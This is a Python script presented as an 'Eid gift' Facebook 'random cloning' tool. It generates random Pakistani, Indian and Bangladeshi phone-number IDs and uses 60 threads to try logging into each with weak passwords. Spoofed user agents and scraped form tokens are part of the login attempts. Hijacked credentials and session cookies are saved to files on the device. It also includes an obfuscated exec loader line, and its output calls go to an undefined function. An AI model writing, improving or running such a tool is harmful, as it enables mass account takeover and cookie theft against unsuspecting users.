#EID MOBARAK 
#GIFT FROM RXS
import os
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    tahosin('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    tahosin('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    tahosin('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=='))
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def rxs_gift():
    os.system('clear')
    tahosin(logo)
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    tahosin('[\033[1;92m1\033[1;97m] RANDOM CLONING')
    tahosin('[\033[1;92m2\033[1;97m] CONTACT ME FACEBOOK')
    tahosin('[\033[1;92m0\033[1;97m] EXIT TOOL')
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    EID = input('\033[1;36mCHOOSE : ')
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    if EID == '1':
    	main()
    if EID == '2':
        os.system('xdg-open https://www.facebook.com/tahosin.broos?mibextid=ZbWKwL')
        rxs_gift()
    if EID == '0': 
        os.system('exit')
        return None
    else:
    	rxs_gift()

logo = ("""
	 ██████  ██ ███████ ████████ 
	██       ██ ██         ██    
	██   ███ ██ █████      ██    
	██    ██ ██ ██         ██    
	 ██████  ██ ██         ██    
\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m
\033[1;32m[\033[1;36m=\033[1;32m] \033[1;37mDEVELOPER : TAHOSINUR RAHMAN
\033[1;32m[\033[1;36m=\033[1;32m] \033[1;37mGITHUB    : BINOD-XD   
\033[1;32m[\033[1;36m=\033[1;32m] \033[1;37mTOOL NAME : RANDOM CLONE
\033[1;32m[\033[1;36m=\033[1;32m] \033[1;37mTOOL TYPE : EID GIFT
\033[1;32m[\033[1;36m=\033[1;32m] \033[1;37mVERSION   : 0.1
\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m""")

try:
    tahosin('\n\n\033[38;5;46mCRACKING UPDATE DONE\033[38;5;46m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:tahosin('\n\033[38;5;46m   No internet connection\033[38;5;46m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        tahosin('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
def main():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    tahosin(logo)
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    tahosin('\033[1;37mPAK CODE   - \033[1;35m92301 \033[1;35m92302 \033[1;35m92303 \033[1;35m92305')
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    tahosin('\033[1;37mINDIA CODE - \033[1;37m91778 \033[1;37m91930 \033[1;37m91902 \033[1;37m91712')
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    tahosin('\033[1;37mBD CODE    - \033[1;33m016 \033[1;33m017 \033[1;33m013 \033[1;33m018 \033[1;33m019 \033[1;33m014 \033[1;33m015')
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    code = input('\033[1;37mCHOOSE YOUR COUNTRY CODE : ')
    limit = int(input('\033[1;37mEXAMPLE : \033[1;93m2000, 5000, 10000, 50000\n\033[1;96mCHOOSE CLONING LIMIT : '))
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=60) as lutu:
        os.system("clear")
        tahosin(logo)
        tl = str(len(user))
        tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
        tahosin('\033[1;37mYOUR CODE : \033[1;96m' +code)
        tahosin('\033[1;37mTOTAL IDS : \033[1;93m'+tl)
        tahosin('\033[1;37mTO STOP PROCESS Ctrl + Z')
        tahosin('\033[1;37mWILL RUN ON ANY NETWORK')
        tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
        tahosin('')
        for love in user:
            pwx = [love, '@#@#@#', 'i love you']
            uid = code+love
            lutu.submit(shipu,uid,pwx,tl)
    tahosin("")
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    tahosin("\033[1;36mTHE PROCESS HAS BEEN ENDED")
    tahosin("\033[1;32m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━━═━━═━━━═━━═━\033[1;37m")
    exit()

def shipu(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;92m[\033[1;93mGIFT\033[1;92m] \033[1;92m[\033[1;93m%s/%s\033[1;92m] \033[1;92m[\033[1;93mOK:\033[1;92%s\033[1;92m]\033[1;97 '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {'authority': 'm.facebook.com',
             'method': 'GET',
             'path': '/login/device-based/login/async/',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
             'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5627.215", "Google Chrome";v="112.0.5627.215"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"macOS"',
             'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro,
             'viewport-width': '980',}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                tahosin(f'\r\33[1;92m [GIFT-OK] '+cid+' | '+ps+'\33[0;92m')
                tahosin(f'\r\033[1;92m [+] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/gift-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[24:39]
            	tahosin('\r\r\033[1;30m[GIFT-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
            	open('/sdcard/gift-CP.txt', 'a').write( cid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
                continue
        loop+=1        
    except:
        pass
        
        
        
rxs_gift()

